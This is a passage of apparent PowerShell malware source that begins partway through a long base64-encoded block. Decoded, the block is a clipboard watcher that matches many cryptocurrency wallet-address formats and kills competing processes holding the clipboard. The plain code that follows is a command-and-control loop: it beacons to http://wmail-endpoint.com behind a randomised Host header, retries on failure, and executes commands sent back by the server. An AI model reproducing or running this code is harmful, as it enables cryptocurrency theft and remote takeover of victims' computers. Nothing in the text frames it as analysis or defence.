wcmVzc2lvbnMuUmVnZXggJ14xW2Eta20tekEtSEotTlAtWjEtOV17MjUsMzR9JCcpKTsNCiRjb2lucy5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4ICdeM1thLWttLXpBLUhKLU5QLVoxLTldezI1LDM0fSQnKSk7DQokY29pbnMuQWRkKChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleCAnXmJjMXFbMC05QS1aYS16XXszNyw2Mn0kJykpOw0KJGNvaW5zLkFkZCgoTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnMuUmVnZXggJ15iYzFwWzAtOUEtWmEtel17MzcsNjJ9JCcpKTsNCiRjb2lucy5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4ICdeKChiaXRjb2luY2FzaDopPyhxfHApW2EtejAtOV17NDF9KSQnKSk7DQokY29pbnMuQWRkKChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleCAnXigoQklUQ09JTkNBU0g6KT8oUXxQKVtBLVowLTldezQxfSkkJykpOw0KJGNvaW5zLkFkZCgoTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnMuUmVnZXggJ14oMHgpWzAtOUEtRmEtZl17NDB9JCcpKTsNCiRjb2lucy5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4ICdeKGJuYjEpWzAtOWEtel17Mzh9JCcpKTsNCiRjb2lucy5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4ICdeWzQ4XVthLXpBLVp8XGRdezk0fShbYS16QS1afFxkXXsxMX0pPyQnKSk7DQokY29pbnMuQWRkKChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleCAnXltYfDddWzAtOUEtWmEtel17MzN9JCcpKTsNCiRjb2lucy5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4ICdeKER8QXw5KVthLWttLXpBLUhKLU5QLVoxLTldezMzLDM0fSQnKSk7DQokY29pbnMuQWRkKChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleCAnXnJbMS05QS1ISi1OUC1aYS1rbS16XXsyNSwzNH0kJykpOw0KJGNvaW5zLkFkZCgoTmV3LU9iamVjdCBTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnMuUmVnZXggJ15UWzEtOUEtSEotTlAtWmEta20tel17MzN9JCcpKTsNCiRjb2lucy5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4ICdeKGthdmExKVswLTlhLXpdezM4fSQnKSk7DQokY29pbnMuQWRkKChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleCAnXihjb3Ntb3MxKVswLTlhLXpdezM4fSQnKSk7DQokY29pbnMuQWRkKChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleCAnXih0elsxLDIsM10pW2EtekEtWjAtOV17MzN9JCcpKTsNCiRjb2lucy5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4ICdeKHQpW0EtWmEtejAtOV17MzR9JCcpKTsNCiRjb2lucy5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4ICdeKChbMC05QS1aYS16XXs1Nyw1OX0pfChbMC05QS1aYS16XXsxMDAsMTA0fSkpJCcpKTsNCiRjb2lucy5BZGQoKE5ldy1PYmplY3QgU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zLlJlZ2V4ICd6aWwxW3FwenJ5OXg4Z2YydHZkdzBzM2puNTRraGNlNm11YTdsXXszOH0nKSk7DQokY29pbnMuQWRkKChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleCAnXlsxLTlBLUhKLU5QLVphLWttLXpdezMyLDQ0fSQnKSk7DQokY29pbnMuQWRkKChOZXctT2JqZWN0IFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9ucy5SZWdleCAnXigxKVswLTlhLXotQS1aXXs0NCw1MH0kJykpOw0KDQokZGlzYWJsZWQgPSBOZXctT2JqZWN0IENvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddOw0KJGRpc2FibGVkLkFkZCgnd3NjcmlwdCcpOw0KJGRpc2FibGVkLkFkZCgncG93ZXJzaGVsbCcpOw0KDQpmdW5jdGlvbiBUZXN0LUNvaW4gew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10NCiAgICAgICAgJHRleHQNCiAgICApDQogICAgZm9yZWFjaCAoJHJneCBpbiAkY29pbnMpIHsNCiAgICAgICAgaWYgKCRyZ3guSXNNYXRjaCgkdGV4dCkpIHsNCiAgICAgICAgICAgIHJldHVybiAkdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICByZXR1cm4gJGZhbHNlOw0KfQ0KDQokX3Byb2Nlc3NpZCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCg0KTsNCmZ1bmN0aW9uIFRlc3QtSW1wb3N0ZXIgew0KICAgIHRyeSB7DQogICAgICAgIFtJbnRQdHJdJGh3bmQgPSAkR2V0Q2xpcGJvYXJkT3duZXIuSW52b2tlKCk7IA0KICAgICAgICBpZiAoJGh3bmQuRXF1YWxzKFtJbnRQdHJdOjpaZXJvKSkgew0KICAgICAgICAgICAgcmV0dXJuICR0cnVlOw0KICAgICAgICB9DQogICAgICAgICR0aGlkID0gJEdldFdpbmRvd1RocmVhZFByb2Nlc3NJZC5JbnZva2UoJGh3bmQsICRfcHJvY2Vzc2lkKTsNCiAgICAgICAgW3VpbnQzMl0kcHJvY2Vzc2lkID0gW3VpbnQzMl0oW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UmVhZEludDMyKCRfcHJvY2Vzc2lkKSk7DQogICAgICAgIGlmICgkcHJvY2Vzc2lkIC1lcSAkUElEKSB7DQogICAgICAgICAgICByZXR1cm4gJGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICRwcm9jZXNzID0gR2V0LVByb2Nlc3MgLUlkICRwcm9jZXNzaWQ7DQogICAgICAgIGZvcmVhY2ggKCRuYW1lIGluICRkaXNhYmxlZCkgew0KICAgICAgICAgICAgaWYgKCRuYW1lLkVxdWFscygkcHJvY2Vzcy5Qcm9jZXNzTmFtZSwgW1N5c3RlbS5TdHJpbmdDb21wYXJpc29uXTo6T3JkaW5hbElnbm9yZUNhc2UpKSB7DQogICAgICAgICAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICAgICAgICAgU3RvcC1Qcm9jZXNzIC1JZCAkcHJvY2Vzc2lkIC1Gb3JjZSB8IE91dC1OdWxsOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCB7ICAgIA0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gJHRydWU7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHNpZyA9IEdldC1BdXRoZW50aWNvZGVTaWduYXR1cmUgLUZpbGVQYXRoICRwcm9jZXNzLlBhdGg7DQogICAgICAgIGlmICgkc2lnLlN0YXR1cyAtZXEgW1N5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uU2lnbmF0dXJlU3RhdHVzXTo6Tm90U2lnbmVkKSB7DQogICAgICAgICAgICByZXR1cm4gJHRydWU7DQogICAgICAgIH0NCiAgICB9DQogICAgY2F0Y2ggew0KICAgICAgICAjICRfOw0KICAgIH0NCiAgICByZXR1cm4gJGZhbHNlOw0KfQ0KDQpmdW5jdGlvbiBIYW5kbGVfV01fQ0xJUEJPQVJEVVBEQVRFIHsNCiAgICB0cnkgew0KICAgICAgICBbc3RyaW5nXSRjdXJyZW50ID0gR2V0LUNsaXA7DQogICAgICAgIGlmIChbc3RyaW5nXTo6SXNOdWxsT3JFbXB0eSgkY3VycmVudCkpIHsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICAkY3VycmVudCA9ICRjdXJyZW50LlRyaW0oKTsNCiAgICAgICAgJGhpc3RvcnkgPSAkY2xpcGhpc3RvcnkuVG9TdHJpbmcoKTsNCiAgICAgICAgaWYgKCRjdXJyZW50LkVxdWFscygkaGlzdG9yeSkpIHsNCiAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICBpZiAoKFRlc3QtQ29pbiAkY3VycmVudCkgLWVxICRmYWxzZSkgew0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgICAgIGlmICgoVGVzdC1JbXBvc3RlcikpIHsNCiAgICAgICAgICAgIFNldC1DbGlwICRoaXN0b3J5Ow0KICAgICAgICAgICAgcmV0dXJuOw0KICAgICAgICB9DQogICAgICAgICRjbGlwaGlzdG9yeS5DbGVhcigpIHwgT3V0LU51bGw7DQogICAgICAgICRjbGlwaGlzdG9yeS5BcHBlbmQoJGN1cnJlbnQpIHwgT3V0LU51bGw7DQogICAgfQ0KICAgIGNhdGNoIHsNCiAgICAgICAgIyAkXzsNCiAgICB9DQp9DQoNCiR3eCA9IEdldC1XbmRDbGFzcyAoW0d1aWRdOjpOZXdHdWlkKCkuVG9TdHJpbmcoKSkgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkdldEZ1bmN0aW9uUG9pbnRlckZvckRlbGVnYXRlKCREZWZXaW5kb3dQcm9jVykpOw0KW3VpbnQxNl0kYXRvbSA9ICRSZWdpc3RlckNsYXNzRXguSW52b2tlKCR3eCk7DQpbSW50UHRyXSRod25kID0gJENyZWF0ZVdpbmRvd0V4Lkludm9rZSgwLCBbSW50UHRyXTo6bmV3KCRhdG9tKSwgKEFsbG9jUHRyIChbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldEJ5dGVzKFtHdWlkXTo6TmV3R3VpZCgpLlRvU3RyaW5nKCkpKSksIDAsIDAsIDAsIDAsIDAsIFtJbnRQdHJdOjpuZXcoLTMpLCBbSW50UHRyXTo6WmVybywgW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvKTsNCg0KJEFkZENsaXBib2FyZEZvcm1hdExpc3RlbmVyLkludm9rZSgkaHduZCkgfCBPdXQtTnVsbDsNCg0KW2ludF0kbXNnX3NpemUgPSAwOw0KaWYgKFtJbnRQdHJdOjpTaXplIC1lcSA4KSB7DQogICAgJG1zZ19zaXplID0gNDg7DQp9DQplbHNlIHsNCiAgICAkbXNnX3NpemUgPSAzMjsNCn0NCiRtc2cgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpBbGxvY0hHbG9iYWwoJG1zZ19zaXplKTsNCndoaWxlICgkR2V0TWVzc2FnZS5JbnZva2UoJG1zZywgMCwgMCwgMCkgLWd0IDApIHsNCg0KICAgIGlmIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpSZWFkSW50MTYoJG1zZywgW1N5c3RlbS5JbnRQdHJdOjpTaXplKSAtZXEgMHgwMzFEKSB7DQogICAgICAgICMgV3JpdGUtSG9zdCAnV01fQ0xJUEJPQVJEVVBEQVRFJzsNCiAgICAgICAgSGFuZGxlX1dNX0NMSVBCT0FSRFVQREFURTsNCiAgICB9DQoNCiAgICAkVHJhbnNsYXRlTWVzc2FnZS5JbnZva2UoJG1zZykgfCBPdXQtTnVsbDsNCiAgICAkRGlzcGF0Y2hNZXNzYWdlLkludm9rZSgkbXNnKSB8IE91dC1OdWxsOw0KfQ0KJFJlbW92ZUNsaXBib2FyZEZvcm1hdExpc3RlbmVyLkludm9rZSgkaHduZCkgfCBPdXQtTnVsbDsNCg0K"));
#$wdgjob = Start-Job -ScriptBlock ([Scriptblock]::Create($wdg)); 


$update = $true;
$retry = 0;
[byte[]]$res = $null;
while ($retry -lt 10) {
    try {
        $client.Headers["Host"] = "$(-join ((97..122) | Get-Random -Count (Get-Random -Minimum 5 -Maximum 10) | % {[char]$_})).com";
        $res = $client.UploadData("http://wmail-endpoint.com", (Build-Request $update));
        $retry = 0;
    }
    catch {
        $retry++;
        Start-Sleep -Seconds 10;
        continue;
    }
    if ($res.Length -lt 4) {
        break;
    }
    $status = [BitConverter]::ToUInt32($res, 0);
    $update = ($status -band 0x1) -eq 1;

    if ($res.Length -gt 4) {
        Run-Command ([Text.Encoding]::UTF8.GetString($res, 4, $res.Length - 4));
    }

    Start-Sleep -Seconds 30;
}
